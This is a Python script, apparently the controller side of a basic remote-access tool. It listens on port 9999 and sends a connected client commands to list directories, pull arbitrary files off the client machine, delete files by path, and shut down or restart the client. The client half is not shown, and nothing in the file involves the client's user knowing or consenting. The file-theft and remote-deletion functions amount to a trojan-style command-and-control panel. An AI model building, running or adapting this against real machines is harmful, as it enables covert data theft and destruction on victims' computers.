import socket
import os

server_socket = socket.socket()
hostname = socket.gethostname()
port_number = 9999
# Know the IP Address of your PC by typing the command
# >>> ipconfig | findstr /C:Address
# IP Address of PC = 192.168.56.1

server_socket.bind((hostname, port_number))

print("Server is currently running at ", hostname, "and at the portnumber ", port_number)

print("Waiting for any incoming connections!")

server_socket.listen(1)
conn, client_address = server_socket.accept()

print(client_address, " has connected to the server successfully!")

# Connection has been established successfully

while 1:
    command = input(str("Type your command >> "))

    if command == "view_cwd":
        conn.send(command.encode())
        print("Command view_cwd has been executed successfully!")

        files = conn.recv(10000)
        files = files.decode()
        print("We are inside the directory named : ", files, " of the client named ", client_address)
    
    elif command == "custom_dir":
        conn.send(command.encode())
        print("Command custom_dir has been executed successfully!")

        directory = input(str("Input the directory whose files you want to see: "))
        conn.send(directory.encode())
        print("Directory name sent!")

        files = conn.recv(10000)
        files = files.decode()
        print("The files inside the directory ", directory, " are given as follows: ")
        print(files)
    
    elif command == "download_files":
        conn.send(command.encode())
        print("Command download_files has been executed successfully!")

        filepath = input(str("Please input the file path including the file name: "))
        conn.send(filepath.encode())
        print("File path sent!")

        files = conn.recv(100000000)
        filename = input(str("Please enter a filename for the incoming file: "))
        new_file = open(filename, "wb")
        new_file.write(files)
        new_file.close()

        print("File downloaded successfully!")
    
    elif command == "remove_files":
        conn.send(command.encode())
        print("Command remove_files has been executed successfully!")

        filepath = input(str("Please input the file path you want to delete: "))
        conn.send(filepath.encode())
        print("File has been deleted successfully!")
    
    elif command == "send_files":
        print("")
    
    elif command == "shutdown_client":
        conn.send(command.encode())
        print("Command shutdown_client has been executed successfully!")
        print("Client PC shutdown!")
    
    elif command == "restart_client":
        conn.send(command.encode())
        print("Command restart_client has been executed successfully!")
        print("Client PC restarted!")

    else:
        print("Command NOT recognized!")
